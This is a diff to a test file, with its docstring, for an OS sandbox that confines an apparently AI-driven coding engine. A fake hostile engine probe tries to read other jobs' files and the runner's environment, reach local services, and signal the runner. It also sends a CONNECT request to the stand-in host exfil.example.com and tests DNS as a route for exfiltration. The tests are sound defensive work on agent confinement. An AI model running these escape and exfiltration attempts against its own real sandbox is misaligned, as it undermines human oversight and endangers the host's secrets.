@@ -2,13 +2,14 @@
 
 The engine runs untrusted request and feedback text, and its tools include arbitrary
 Python, so Claude Code's tool permissions are not a boundary. The runner puts the whole
-engine process tree in an OS sandbox (tools/arc2/confine.py) that denies by default. A
-job may write only its own run, its request file and its own throwaway home. It may
+engine process tree in an OS sandbox (tools/arc2/confine.py): file writes are denied by
+default, and reads, the network and other processes where they matter. A job may write only its own run, its request file and its own throwaway home. It may
 read the repository and its own run. It cannot reach:
 
 * other runs, ``_studio/`` (where ownership lives), ``_queue/``, ``_jobs/`` or ``_history/``;
 * the runner account's home: other jobs' Claude sessions, ``~/.gitconfig``, ``~/.ssh``;
 * local services: the Docker socket, the API, Redis;
+* the internet, except through the runner's allow-listing egress proxy (no DNS either);
 * other processes (no signals to them, no reading their arguments);
 * the runner's environment beyond an allow-list.
 
@@ -16,9 +17,9 @@ The runner's git snapshot after a job must not run anything the job planted, and
 not follow a run folder the job replaced with a link. Without a sandbox the runner does
 not start unless an operator opts out explicitly.
 
-The end-to-end cases run a hostile fake ``claude`` through ``runner.main``. They need
-macOS (Seatbelt) and are skipped elsewhere; the fail-closed and profile cases run
-everywhere.
+The end-to-end cases run a hostile fake ``claude`` through ``runner.main``, once per OS
+sandbox the host has: Seatbelt on macOS, bubblewrap on Linux (CI installs it). The
+fail-closed and profile cases run everywhere.
 """
 
 from __future__ import annotations
@@ -40,7 +41,7 @@ from arc2 import confine, runner
 SLUG = "arc2-mine"
 
 PROBE = r"""#!/usr/bin/python3
-import json, os, signal, socket, subprocess, sys
+import errno, json, os, signal, socket, subprocess, sys
 runs, repo, probe = os.environ["PROBE_RUNS"], os.environ["PROBE_REPO"], os.environ["PROBE_NAME"]
 real_home, port, runner_pid = os.environ["PROBE_REAL_HOME"], int(os.environ["PROBE_PORT"]), int(os.environ["PROBE_PARENT"])
 results = {}
@@ -78,6 +79,37 @@ attempt("connect_localhost", connect_tcp)
 attempt("connect_unix_socket", connect_unix)
 attempt("signal_runner", lambda: os.kill(runner_pid, 0))
 attempt("read_runner_environ", read(f"/proc/{runner_pid}/environ"))
+def direct_out():
+    try:
+        socket.create_connection(("192.0.2.1", 443), timeout=2).close()  # TEST-NET: never answers
+        return "connected"
+    except PermissionError:
+        return "blocked"  # refused by the sandbox (EPERM), not merely unreachable
+    except OSError as exc:
+        if exc.errno == errno.ENETUNREACH:
+            return "blocked"  # a network namespace with no route out at all (bubblewrap)
+        return "unreachable"
+results["direct_internet"] = direct_out()
+def via_proxy(host):
+    proxy = os.environ.get("HTTPS_PROXY", "")
+    if not proxy:
+        return "no-proxy"
+    p_host, p_port = proxy.rsplit("/", 1)[-1].split(":")
+    s = socket.create_connection((p_host, int(p_port)), timeout=5)
+    s.sendall(f"CONNECT {host}:443 HTTP/1.1\r\nHost: {host}:443\r\n\r\n".encode())
+    reply = s.recv(64).decode("latin-1")
+    s.close()
+    return "tunnelled" if " 200 " in reply else "refused" if " 403 " in reply else reply[:20]
+results["proxy_other_host"] = via_proxy("exfil.example.com")
+def dns_lookup():
+    # A name that exists: if it resolves, the job can send data out in DNS queries. (A
+    # made-up name is useless here: a lookup that never left also says "not found".)
+    try:
+        socket.getaddrinfo("example.com", 443)
+        return "resolved"
+    except OSError:
+        return "blocked"
+results["dns_lookup"] = dns_lookup()
 results["sees_runner_secret"] = "PROBE_RUNNER_SECRET" in os.environ
 results["home_is_fresh"] = os.environ["HOME"] != real_home and os.environ.get("CLAUDE_CONFIG_DIR", "").startswith(os.environ["HOME"])
 # Plant things the runner's history snapshot would run or follow, outside the sandbox.
@@ -100,9 +132,8 @@ needs_seatbelt = pytest.mark.skipif(
 SANDBOXES = [name for name in ("seatbelt", "bubblewrap") if confine.BACKENDS[name]().available()] or [
     pytest.param("none-available", marks=pytest.mark.skip(reason="no OS sandbox on this host"))
 ]
-# Documented gaps (confine.Bubblewrap): Linux shares the network namespace, so local
-# services stay reachable from a job unless the host firewall blocks the runner account.
-KNOWN_GAPS = {"bubblewrap": {"connect_localhost": "allowed", "connect_unix_socket": "allowed"}}
+# Per-backend differences from EXPECTED, if a backend ever has a documented gap.
+KNOWN_GAPS: dict = {}  # none since bubblewrap jobs got their own network namespace
 
 
 @pytest.fixture
@@ -208,6 +239,9 @@ EXPECTED = {
     "connect_unix_socket": "denied",
     "signal_runner": "denied",
     "read_runner_environ": "denied",
+    "direct_internet": "blocked",
+    "proxy_other_host": "refused",
+    "dns_lookup": "blocked",  # DNS is an exfiltration channel; the proxy resolves hosts outside the sandbox
     "sees_runner_secret": False,
     "home_is_fresh": True,
 }
@@ -280,7 +314,7 @@ def test_running_unconfined_takes_an_explicit_choice():
     assert confine.select("none").name == "none"
 
 
-def test_the_profile_denies_by_default_and_allows_the_job_last(tmp_path):
+def test_the_profile_denies_writes_by_default_and_allows_the_job_last(tmp_path):
     runs = tmp_path / 'we"ird\\runs'
     jail = confine.Jail(
         repo=tmp_path / "repo",
